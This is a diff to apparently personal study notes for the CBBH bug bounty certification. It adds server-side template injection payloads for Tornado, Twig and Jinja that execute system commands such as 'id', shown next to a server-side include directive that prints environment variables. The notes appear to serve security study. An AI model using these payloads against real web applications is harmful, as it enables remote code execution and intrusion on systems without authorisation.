@@ -153,4 +153,15 @@ Stuff for CBBH
     
     // Print all variables
     <!--#printenv -->
+
+    #SSTI
+    Tornado RCE
+    {% import os %}{{ os.popen("id").read() }}
+
+    Twig RCE
+    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("env")}}
+
+    #Jinja1 RCE
+    {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+    
     
